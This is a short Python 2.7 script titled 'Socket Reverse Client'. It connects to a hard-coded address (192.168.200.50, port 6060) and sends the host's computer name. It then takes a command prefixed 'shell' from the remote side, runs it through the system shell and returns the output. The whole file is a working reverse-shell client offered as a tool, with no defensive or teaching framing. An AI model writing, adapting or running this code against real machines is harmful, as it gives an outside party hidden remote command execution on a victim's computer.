#!/usr/bin/python2.7
#-*- coding: utf-8 -*-

#################################################
#Title : Socket Reverse	Client					#
#DAte : 05/09/2017								#
#Author : GrandPa								#
################################################# 

 	
#################################################
#Import externals functions: 
import socket, subprocess, os
import time 


#################################################
#Def local or global: 
hote = '192.168.200.50'
port = 6060
mysock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def process():
	process = mysock.recv(16384)
	if process == 'quit':
		mysock.close()
	elif process[0:5] == 'shell':
		proc2 = subprocess.Popen(process[6:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		stdout_value = proc2.stdout.read() + proc2.stderr.read()
		args = stdout_value
	else:
		args = 'no valid input was given'
	send(args)

def send(args):
	send = mysock.send(args)

#################################################
#Programm Body:
os.system('cls')

mysock.connect((hote,port))
mysock.send(os.environ['COMPUTERNAME'])

process()
mysock.close()
